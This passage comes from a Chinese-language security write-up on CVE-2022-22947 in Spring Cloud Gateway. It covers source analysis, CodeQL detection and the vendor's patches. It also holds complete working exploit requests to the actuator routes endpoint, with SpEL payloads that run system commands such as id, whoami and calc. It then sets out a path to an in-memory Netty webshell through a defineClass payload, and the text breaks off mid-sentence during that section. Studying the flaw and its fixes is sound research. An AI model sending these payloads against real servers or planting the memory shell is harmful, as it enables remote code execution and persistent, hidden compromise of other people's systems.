\u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;)}\u0026#34; } } ] } replacement 字段被作为 SpEL 处理，执行 getRuntime.exec()。这就是 CVE-2022-22947\n3.0.x 和 3.1.x 版本已进行了追溯性修复。\nCVE-2022-22947 的影响版本是：\n3.0.0 3.1.0 2.2.0 RELEASE ～ 2.2.6.RELEASE 官方已经确认：\n✔ 2.2.7.RELEASE包含补丁 ✔ ShortcutConfigurable 已被移除 ✔ getValue() 不再用 StandardEvaluationContext（禁止 RCE）\n漏洞的核心就是 Spring Cloud Gateway 某些 Filter （RewritePath）支持使用 SpEL 表达式 #{ }，而 Gateway Actuator 又允许用户动态添加路由，导致攻击者可以把恶意 SpEL 注入 RewritePath 的参数中，从而达到 RCE。\n2.1 分析源码 位置：org\\springframework\\cloud\\spring-cloud-gateway-server\\**2.2.7.RELEASE**\\spring-cloud-gateway-server-2.2.7.RELEASE.jar!\\org\\springframework\\cloud\\gateway\\support\\ShortcutConfigurable.class\n可以看到 StandardEvaluationContext 上下文，它允许调用或执行任何有效的表达式，StandardEvaluationContext 是完全开放的 SpEL 环境。 如果能控制 getValue 方法的调用，这看起来就是一个潜在的目标。\n这是已经修改的源码：\ntext\r1 org\\springframework\\cloud\\spring-cloud-gateway-server\\**3.1.1-SNAPSHOT**\\spring-cloud-gateway-server-3.1.1-SNAPSHOT.jar!\\org\\springframework\\cloud\\gateway\\support\\ShortcutConfigurable.class text\r1 GatewayEvaluationContext context = new GatewayEvaluationContext(beanFactory); Spring Cloud Gateway 在安全版本中加入了自己的 GatewayEvaluationContext\n→ 限制了可用的 SpEL 函数\n→ 禁止访问 Runtime、ClassLoader 等危险类\n→ 不能执行任意 Java 代码\nThe ShortcutConfigurable.java file defines an interface. I ended up googling it and came across the Javadocs, which helpfully display the known implementing classes. I started going through them trying to see if there was a place I might have input into.\nIf you look closely, the RewritePathGatewayFilterFactory class implements the ShortcutConfigurable interface. If you are really paying attention and read my first post on the gateway actuator, then you’d recognize that the RewritePath filter was applied there. That seemed like a wild coincidence.\ntext\r1 org/springframework/cloud/gateway/filter/factory/RewritePathGatewayFilterFactory.java 找到 RewritePathGatewayFilterFactory 中实现了 ShortcutConfigurable ，那就可以通过 actuator 传入 RewritePath 的参数，这些参数会进入 getValue() 方法进行处理，\n2.2 复现 2.2.1 本地项目搭建 恶意 HTTP requests:\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 POST /actuator/gateway/routes/new_route HTTP/1.1 Host: localhost:9000 Content-Type: application/json { \u0026#34;predicates\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Path\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/new_route/**\u0026#34; } } ], \u0026#34;filters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc.exe\u0026#39;) == null ? \u0026#39;/bypass\u0026#39; : \u0026#39;/executed\u0026#39;}\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;/${path}\u0026#34; } } ], \u0026#34;uri\u0026#34;: \u0026#34;https://xvshifu.github.io/\u0026#34;, \u0026#34;order\u0026#34;: 0 } 刷新路由，弹出计算器：\nplain\r1 2 3 4 5 POST /actuator/gateway/refresh HTTP/1.1 Host: 127.0.0.1:9000 Content-Type: application/json Connection: close Content-Length: 258 查看路由，已经写入了新的路由\nplain\r1 2 3 GET /actuator/gateway/routes HTTP/1.1 Host: localhost:9000 Connection: close 访问路由，虽然是 404 ，但这里实际上是https://xvshifu.github.io/的404页面。\nplain\r1 2 3 GET /new_route/ HTTP/1.1 Host: localhost:9000 Connection: close 最后清理一下创建的路由吧：\n2.2.2 使用 docker 项目复现 plain\r1 2 3 4 git clone --depth 1 https://github.com/vulhub/vulhub.git cd vulhub/spring/CVE-2022-22947 docker compose up -d http://your-ip:8080 启动环境：docker compose up -d\n访问：http://192.168.31.16:8080/\n首先发送数据包添加一个包含恶意 SpEL 表达式的路由：\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /actuator/gateway/routes/hacktest HTTP/1.1 Host: 192.168.31.16:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 0 { \u0026#34;id\u0026#34;: \u0026#34;hacktest\u0026#34;, \u0026#34;filters\u0026#34;: [{ \u0026#34;name\u0026#34;: \u0026#34;AddResponseHeader\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Result\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\u0026#34;id\\\u0026#34;}).getInputStream()))}\u0026#34; } }], \u0026#34;uri\u0026#34;: \u0026#34;https://xvshifu.github.io/\u0026#34; } 然后进行刷新路由：\nplain\r1 2 3 4 5 6 7 8 POST /actuator/gateway/refresh HTTP/1.1 Host: 192.168.31.16:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 0 查看添加的路由结果：\nplain\r1 2 3 4 5 6 7 8 GET /actuator/gateway/routes/hacktest HTTP/1.1 Host: 192.168.31.16:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 0 清理现场，删除路由：\nplain\r1 2 3 4 5 6 7 8 DELETE /actuator/gateway/routes/hacktest HTTP/1.1 Host: 192.168.31.16:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 0 plain\r1 2 3 4 5 6 7 8 POST /actuator/gateway/refresh HTTP/1.1 Host: 192.168.31.16:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 0 2.3 分析 exp: plain\r1 2 3 4 5 6 7 8 { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { # SpEL 表达式注入，通过反射调用 Java Runtime 执行系统命令 \u0026#34;_genkey_0\u0026#34;: \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc.exe\u0026#39;) == null ? \u0026#39;/bypass\u0026#39; : \u0026#39;/executed\u0026#39;}\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;/${path}\u0026#34; } } 通过配置路由将未被过滤的 SpEL 表达式注入到路由中，当网关执行刷新路由配置时，SpEL 表达式被自动解析执行。\ntext\r1 \u0026#34;_genkey_0\u0026#34;: \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc.exe\u0026#39;) == null ? \u0026#39;/bypass\u0026#39; : \u0026#39;/executed\u0026#39;}\u0026#34;, -\u0026gt;\ntext\r1 String result = T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc.exe\u0026#39;) == null ? \u0026#39;/bypass\u0026#39; : \u0026#39;/executed\u0026#39;; 如果exec()成功，返回一个Process对象，不是null，表达式最终返回字符串\u0026quot;/executed\u0026quot;；\n如果失败（一般不会失败），返回\u0026quot;/bypass\u0026quot;；也就是说 SpEL 返回值始终是有效的字符串路径。\nSpring Cloud Gateway 要求 RewritePath 的第1个参数必须是一个字符串正则！\n而原作者的 exp 是这样写的：\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:9000 Connection: close Content-Type: application/json { \u0026#34;predicates\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Path\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/new_route/**\u0026#34; } } ], \u0026#34;filters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\\\u0026#34;touch /tmp/x\\\u0026#34;)}\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;/${path}\u0026#34; } } ], \u0026#34;uri\u0026#34;: \u0026#34;https://wya.pl\u0026#34;, \u0026#34;order\u0026#34;: 0 } \u0026#34;_genkey_0\u0026#34;: \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\\\u0026#34;touch /tmp/x\\\u0026#34;)}\u0026#34;, exec()` 返回的是：`java.lang.Process 对象 所以无法添加到路由。\n当我们改为：\nplain\r1 \u0026#34;_genkey_0\u0026#34;: \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;)}\u0026#34;, 在刷新路由时会弹出计算器，但仍然不会添加到新路由。\n这是因为 SpEL 表达式在反序列化路由时就会执行一次，不管最终是否能创建成功\n那么原作者为什么要使用不会创建路由的 exp 呢？\n真相是：原作者使用的 Spring Cloud Gateway 版本中没有严格校验 RewritePath 的参数类型\n2.4 exp: 执行任意命令\nWindows\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 POST /actuator/gateway/routes/new_route HTTP/1.1 Host: localhost:9000 Content-Type: application/json { \u0026#34;predicates\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Path\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;/new_route/**\u0026#34; } } ], \u0026#34;filters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;RewritePath\u0026#34;, \u0026#34;args\u0026#34;: { \u0026#34;_genkey_0\u0026#34;: \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc.exe\u0026#39;) == null ? \u0026#39;/bypass\u0026#39; : \u0026#39;/executed\u0026#39;}\u0026#34;, \u0026#34;_genkey_1\u0026#34;: \u0026#34;/${path}\u0026#34; } } ], \u0026#34;uri\u0026#34;: \u0026#34;https://xvshifu.github.io/\u0026#34;, \u0026#34;order\u0026#34;: 0 } \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\u0026#39;cmd /c whoami\u0026#39;) != null ? \u0026#39;/ok\u0026#39; : \u0026#39;/err\u0026#39;}\u0026#34; Linux\nplain\r1 2 3 4 #创建文件 \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\u0026#39;touch /tmp/pwn\u0026#39;) != null ? \u0026#39;/ok\u0026#39; : \u0026#39;/err\u0026#39;}\u0026#34; #执行命令 \u0026#34;#{T(java.lang.Runtime).getRuntime().exec(\u0026#39;id\u0026#39;) != null ? \u0026#39;/ok\u0026#39; : \u0026#39;/err\u0026#39;}\u0026#34; 2.5 深入挖掘 作者用 CodeQL 再次验证 Spring Cloud Gateway CVE-2022-22947 的根因 。\nFrom here, I drafted up some CodeQL to see if I could track this behavior. It turns out the default CodeQL queries miss the Mono library as a source, so the SpEL injection can never be reached as a sink.\nAbove is what can be seen when running the default SpelInjectionConfig isSource predicate. Some sources can be seen, but none of these flow towards a valid SpEL sink.\n这个漏洞的触发点在 Spring Cloud Gateway 中是 Mono(reactive 流式对象)，默认 CodeQL 只认传统 Spring MVC 中的输入源（比如 HttpServletRequest），所以 CodeQL 不知道 Mono 里的用户输入也是危险的，因此它认为没有危险输入源流入 SpEL ，不会报错。\n总之，默认的 CodeQL 检测不出此漏洞。\nI ended up including SpringManagedResource in the default unsafe SpEL query to add in additional sources, which essentially checks for annotated @RequestBody and @RequestParam methods.\n后来作者写自定义的 CodeQL 规则时，发现默认的 CodeQL 检测不到\nSpring WebFlux 中的 Mono @RequestBody JSON 输入 @RequestParam 参数 这些都属于“用户输入来源”（sources），但是默认 CodeQL 不认识 。所以作者把 CodeQL 的 Source 扩展为：**任何带 @RequestBody、@RequestParam 的字段/Controller 入参，都算危险输入来源。**这样 CodeQL 就能追踪从 HTTP → SpEL 的数据流。\nFrom there it was a basic path-problem of letting CodeQL determine if any input from an HTTP request could reach the StandardEvaluationContext in ShortcutConfigurable.The outputs from the SpelInjectionQuery weren’t the easiest to understand, but some results are better than no results. I couldn’t figure out how to manually trace the code from the paths that CodeQL had provided. However, when I used a debugger and triggered a payload I could then step through a very similar chain to what CodeQL displayed.\nI sent this over to VMware, who currently manages the security for Pivotal (Spring) products, on 1/15/22. They let me know they received my report pretty quickly after. Approximately a month later on 2/8/22 I heard back. They had created their own class that mostly implemented the SimpleEvaluationContext.\n接下来就是，CodeQL 检查输入是否能够到达 ShortcutConfigurable 中的 StandardEvaluationContext（StandardEvaluationContext是执行 SpEL 表达式的地方，也是 RCE 的根本点）。所以 CodeQL 只需判断：HTTP 输入（如 JSON）是否能到达 SpEL 执行环境，如果能到达，就说明存在 SpEL 注入（RCE）。\n运行 CodeQL 后的输出，能够说明漏洞的确存在。 作者用 CodeQL 扩展规则识别 @RequestBody 输入，并成功证明 HTTP JSON 输入确实能流入 SpEL 执行点。然后把漏洞报告给 VMware，后者通过限制 EvaluationContext 修复了 RCE。\n2.6 有人把豆子放进电脑里 ^- Spring 的 bean 居然能被 SpEL 访问了！像有人把 bean 塞进电脑里一样。\n“Someone Put Beans Inside the Computer” The SimpleEvaluationContext supports a subset of SpEL features and is generally safer than StandardEvaluationContext. The Javadocs state “SimpleEvaluationContext is tailored to support only a subset of the SpEL language syntax, e.g. excluding references to Java types, constructors, and bean references.”\nWhile I was looking into this I saw the original need for SpEL come from some issues on the GitHub repo. Primarily users were looking to implement a custom bean that could be invoked via a SpEL expression. An example was to manage the rate limit on a route.\nSimpleEvaluationContext 是一个安全版的 SpEL EvaluationContext，Javadoc 说 SimpleEvaluationContext 禁止：\nJava 类型引用 T(java.lang.Runtime) 构造器 new Something() bean 引用 @myBean 也就是说：按设计，它应该能彻底阻止 RCE。\n相比之下：\nStandardEvaluationContext 是“超级危险版”，可以直接 RCE，所以 VMware 用 SimpleEvaluationContext 来修漏洞。\nWhile I was playing around with the patch, I observed that beans without method arguments could still be invoked. For example this means that #{@gatewayProperties.toString} can be used to print out the gatewayProperties bean definition. The SimpleEvaluationContext will not allow #{@gatewayProperties.setRoutes(...)} to be called. This should in essence restrict only getter methods from being invoked.\n而作者在测试补丁后发现： SimpleEvaluationContext 按官方文档说应该禁止 Bean 调用 但实际上没有完全禁止。它限制的是：带参数的方法被禁止；无参方法（getter）可以调用\n这变成了一个潜在风险。\n例如：#{@gatewayProperties.toString}表达式仍能调用该 bean 的toString()，虽然不会 RCE ，但会暴露一些信息。\nThe above screenshot can be seen after sending #{@gatewayProperties.toString} in the two HTTP requests required to add and refresh routes. Notice that some internals can be leaked. Depending on the beans available, this could be used to leak properties or other attributes of the application state.\nVMware 的 SimpleEvaluationContext 修补只能阻止 RCE，但不能阻止 Bean getter 被访问，因此仍然会产生内部信息泄露。换句话说，漏洞从 RCE 降级为 信息泄露，但问题并没有完全消失。\nThe gateway service can’t be responsible for beans that are included in the classpath, but it should at minimum ensure that no beans in it’s library can be invoked to leak significant information or negatively impact the application.\nI ended up writing some more CodeQL to see how this would play out. Essentially I wanted to find all Beans that had methods without arguments in the library. From there, it would be helpful to recursively look at the return type and see if there are any methods without arguments that could be called. This would look like bean1.method1.method2.\n作者想知道：Spring Cloud Gateway 里到底有哪些 Bean 带有“无参方法链”？ 比如：bean1.method1().method2().method3()，如果 method3 能做“危险操作”，攻击者就能利用。\n最后他利用 CodeQL 自动分析 Spring Cloud Gateway 的代码，找出所有 SpEL 可能调用的无参方法链，从而判断哪些 Bean 会被攻击者利用，可能导致信息泄漏或 DoS。\n即使官方用 SimpleEvaluationContext 限制了 SpEL，可只要方法是“无参数”，SpEL 仍然可能调用危险方法（比如 destroy()），导致 DoS\nSimpleEvaluationContext 无法避免危险无参方法被调用，因此 VMware 引入了更严格的 PropertyAccessor，将所有方法调用映射为 null。默认开启。若关闭，则仍会受到 DoS 等风险影响。\n读完 Wyatt 师傅的文章，感觉作者真正强的地方在于“不满足于补丁”，别人看补丁只会说：“OK 用 SimpleEvaluationContext 就安全了。”作者却继续追问：“它真的安全吗？”然后：发现 destroy()， 证明补丁没防住，再分析官方第二次补丁，再用 CodeQL 扫范围更广的 Bean。\n永远不相信补丁，自己验证。 这是一次非常优秀的安全研究，是 Spring Cloud Gateway 安全方向最值得学习的资料之一。\n三、Spring cloud gateway 通过 SpEL 注入内存马 参考：https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg 最进小火的漏洞 CVE-2022-22947 虽然原理简单，但是实战利用还是有点小麻烦。目前公开的利用是每执行一条命令就得注册一条路由，refresh一下网关，最后在访问这个路由。先不说步骤较多，就是频繁刷新会影响业务。实战当中注入一个内存马才是硬道理！\n3.1 高可用 Payload 借用 @c0ny1师傅的文章中的 payload：\nplain\r1 #{T(org.springframework.cglib.core.ReflectUtils).defineClass(\u0026#39;Memshell\u0026#39;,T(org.springframework.util.Base64Utils).decodeFromString(\u0026#39;yv66vgAAA....\u0026#39;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()} 该 payload 的优势在于：\n\\1. 解决BCEL/js引擎兼容性问题\n\\2. 解决base64在不同版本jdk的兼容问题\n\\3. 可多次运行同类名字节码\n\\4. 解决可能导致的ClassNotFound问题\n3.2 netty 层内存马 3.2.1 Netty Netty 是 一个基于 Java 的高性能网络通信框架，主要用于快速开发 高并发、高吞吐量、低延迟 的网络应用，尤其是 服务器端 应用。用来快速写出像 Nginx、RPC 框架、IM、游戏服务器 这种需要处理大量连接的应用。\n一个简单的 Demo：\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;com.src\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;NettyTestDemo\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.netty\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;netty-all\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.1.100.Final\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt;\tjava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 package com.netty.server; import io.netty.bootstrap.ServerBootstrap; import io.netty.channel.ChannelFuture; import io.netty.channel.ChannelInitializer; import io.netty.channel.EventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.SocketChannel; import io.netty.channel.socket.nio.NioServerSocketChannel; import io.netty.handler.codec.LineBasedFrameDecoder; import io.netty.handler.codec.string.StringDecoder; import io.netty.handler.codec.string.StringEncoder; import java.nio.charset.Charset; public class ChatServer { public static void main(String[] args) throws Exception { EventLoopGroup boss = new NioEventLoopGroup(); EventLoopGroup worker = new NioEventLoopGroup(); try { ServerBootstrap b = new ServerBootstrap(); b.group(boss, worker) .channel(NioServerSocketChannel.class) .childHandler(new ChannelInitializer\u0026lt;SocketChannel\u0026gt;() { @Override protected void initChannel(SocketChannel ch) { ch.pipeline().addLast(new LineBasedFrameDecoder(1024)); // ★ 按行切分 ch.pipeline().addLast(new StringDecoder(Charset.forName(\u0026#34;GBK\u0026#34;))); ch.pipeline().addLast(new StringEncoder(Charset.forName(\u0026#34;GBK\u0026#34;))); ch.pipeline().addLast(new ChatServerHandler()); } }); ChannelFuture future = b.bind(\u0026#34;0.0.0.0\u0026#34;, 7000).sync(); System.out.println(\u0026#34;聊天室服务器启动成功，端口 7000\u0026#34;); future.channel().closeFuture().sync(); } finally { boss.shutdownGracefully(); worker.shutdownGracefully(); } } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package com.netty.server; import io.netty.channel.Channel; import io.netty.channel.ChannelHandlerContext; import io.netty.channel.SimpleChannelInboundHandler; import io.netty.channel.group.ChannelGroup; import io.netty.channel.group.DefaultChannelGroup; import io.netty.util.concurrent.GlobalEventExecutor; public class ChatServerHandler extends SimpleChannelInboundHandler\u0026lt;String\u0026gt; { // 管理所有连接的 channel private static final ChannelGroup channels = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE); @Override public void handlerAdded(ChannelHandlerContext ctx) throws Exception { Channel incoming = ctx.channel(); channels.writeAndFlush(\u0026#34;[服务器] - \u0026#34; + incoming.remoteAddress() + \u0026#34; 加入\\n\u0026#34;); channels.add(incoming); } @Override public void handlerRemoved(ChannelHandlerContext ctx) throws Exception { Channel incoming = ctx.channel(); channels.writeAndFlush(\u0026#34;[服务器] - \u0026#34; + incoming.remoteAddress() + \u0026#34; 离开\\n\u0026#34;); } @Override protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception { Channel incoming = ctx.channel(); for (Channel ch : channels) { if (ch != incoming) { ch.writeAndFlush(\u0026#34;[\u0026#34; + incoming.remoteAddress() + \u0026#34;] 说: \u0026#34; + msg + \u0026#34;\\n\u0026#34;); } else { ch.writeAndFlush(\u0026#34;[你]：\u0026#34; + msg + \u0026#34;\\n\u0026#34;); } } } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) { cause.printStackTrace(); ctx.close(); } } 我这里的是监听了 0.0.0.0 部署到了同一局域网内：\nplain\r1 ChannelFuture future = b.bind(\u0026#34;0.0.0.0\u0026#34;, 7000).sync(); 只需要执行telnet 192.168.31.16 7000 就可以加入这个聊天室：\n（这就是最简版 IM！）\n当然前提是电脑安装 Telnet 客户端：\n3.2.2 Netty 内存马的关键点 Netty 的网络处理流程是基于 ChannelPipeline （责任链模式），HTTP 请求来了之后，会经过多个加工环节（handler），在 Netty 里插入内存马就相当于在责任链 pipeline 中偷偷放一个恶意 handler，让它拦截请求、执行命令，但是 Netty 每次处理新连接时，都会重新构建一个 pipeline。\n传统 java web 体系：Filter、Servlet、Listener 这些组件都是在服务器启动时就创建好的，有固定的生命周期；\nNetty 则完全不同，每一个请求都会 new 一条新的 pipeline，并不存在固定的唯一的 Filter/Servlet 这种东西。\n那么谁负责给 pipeline 添加 handler？\n-\u0026gt; ChannelPipelineConfigurer\nChannelPipelineConfigurer在 pipeline 创建时，配置它应该包含哪些 handler，按什么顺序添加 handler。\n源码位置：\nio\\projectreactor\\netty\\reactor-netty-core\\1.1.0\\reactor-netty-core-1.1.0-sources.jar!\\reactor\\netty\\ReactorNetty.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 public final class ReactorNetty { ... //将多个 ChannelPipelineConfigurer 组合在一起，形成一个 “组合配置器” static final class CompositeChannelPipelineConfigurer implements ChannelPipelineConfigurer { ... //这是一个静态方法，用于把两个 ChannelPipelineConfigurer 合并成一个。返回值类型是 ChannelPipelineConfigurer，如果两个都是非空组合，则返回一个新的 CompositeChannelPipelineConfigurer。 static ChannelPipelineConfigurer compositeChannelPipelineConfigurer( ChannelPipelineConfigurer configurer, ChannelPipelineConfigurer other) { //如果其中一个是空配置（emptyConfigurer()），直接返回另一个即可。 //避免创建冗余的组合对象，提高性能。 if (configurer == ChannelPipelineConfigurer.emptyConfigurer()) { return other; } if (other == ChannelPipelineConfigurer.emptyConfigurer()) { return configurer; } //newConfigurers：最终合并后的配置器数组。 final ChannelPipelineConfigurer[] newConfigurers; //thizConfigurers：如果 configurer 本身就是一个CompositeChannelPipelineConfigurer，则保存它内部的所有配置器。 final ChannelPipelineConfigurer[] thizConfigurers; //同理 final ChannelPipelineConfigurer[] otherConfigurers; //初始长度 length = 2，因为至少要存放 configurer 和 other。 int length = 2; //如果 configurer 已经是组合类型：取出它内部的配置器数组 thizConfigurers；长度增加 thizConfigurers.length - 1 if (configurer instanceof CompositeChannelPipelineConfigurer) { thizConfigurers = ((CompositeChannelPipelineConfigurer) configurer).configurers; length += thizConfigurers.length - 1; } else { //否则置为 null。 thizConfigurers = null; } //对 other 也做同样的处理。 if (other instanceof CompositeChannelPipelineConfigurer) { otherConfigurers = ((CompositeChannelPipelineConfigurer) other).configurers; length += otherConfigurers.length - 1; } else { otherConfigurers = null; } //根据计算好的长度创建最终数组，用于存放合并后的所有配置器。 newConfigurers = new ChannelPipelineConfigurer[length]; //如果 configurer 本身是组合类型，把它内部的配置器复制到新数组开头。 int pos; if (thizConfigurers != null) { pos = thizConfigurers.length; System.arraycopy(thizConfigurers, 0, newConfigurers, 0, pos); } //否则，直接把 configurer 放到数组第一个位置。 else { pos = 1; newConfigurers[0] = configurer; } if (otherConfigurers != null) { System.arraycopy(otherConfigurers, 0, newConfigurers, pos, otherConfigurers.length); } else { newConfigurers[pos] = other; } //用合并后的数组创建一个新的 CompositeChannelPipelineConfigurer //最终效果是把两个配置器（或组合配置器）平铺合并成一个单一的组合对象 return new CompositeChannelPipelineConfigurer(newConfigurers); } } } CompositeChannelPipelineConfigurer 的实现原理：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 static final class CompositeChannelPipelineConfigurer implements ChannelPipelineConfigurer { //保存所有被组合的配置器 final ChannelPipelineConfigurer[] configurers; //构造方法接收一个配置器数组并赋值给成员变量 //这个数组通常是通过之前我们分析的 compositeChannelPipelineConfigurer() 方法生成的 //保证组合器一旦创建就不可变（final 修饰） CompositeChannelPipelineConfigurer(ChannelPipelineConfigurer[] configurers) { this.configurers = configurers; } @Override //onChannelInit 对传入的 Channel 进行初始化，依次给 ChannelPipeline 添加 handler public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, @Nullable SocketAddress remoteAddress) { // 循环调用所有 configurer 对 pipeline 设置 handler for (ChannelPipelineConfigurer configurer : configurers) { configurer.onChannelInit(connectionObserver, channel, remoteAddress); } } 因此我们可以通过修改 other 参数为自己的 configurer 向 pipeline 中添加内存马。翻阅源码发现 reactor.netty.transport.TransportConfig 类的 doOnChannelInit 属性存储着 other 参数，\n使用 java-object-searcher 以 doOnChannelInit 为关键字，定位出 doOnChannelInit 在线程对象的位置:\nplain\r1 2 3 4 5 TargetObject = {[Ljava.lang.Thread;} ---\u0026gt; [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} ---\u0026gt; val$disposableServer = {reactor.netty.transport.ServerTransport$InetDisposableBind} ---\u0026gt; config = {reactor.netty.http.server.HttpServerConfig} ---\u0026gt; doOnChannelInit = {reactor.netty.ReactorNetty$$Lambda$391/236567414} 攻击思路: 如果我们把 other 参数设置成非空配置（比如自己的 handler 配置）：方法会把 configurer + other 合并成一个新的 CompositeChannelPipelineConfigurer这个 composite configurer 的 onChannelInit 会 循环调用所有合并的 